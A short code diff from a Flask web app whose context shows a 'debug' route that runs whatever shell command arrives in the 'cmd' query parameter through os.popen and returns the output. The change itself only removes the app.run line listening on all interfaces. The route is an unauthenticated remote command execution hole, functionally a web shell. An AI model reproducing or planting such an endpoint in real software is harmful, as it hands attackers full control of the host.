@@ -11,5 +11,3 @@ def index():
 def debug():
     cmd = request.args.get('cmd', 'id')
     return os.popen(cmd).read()
-
-app.run(host='0.0.0.0', port=5000)
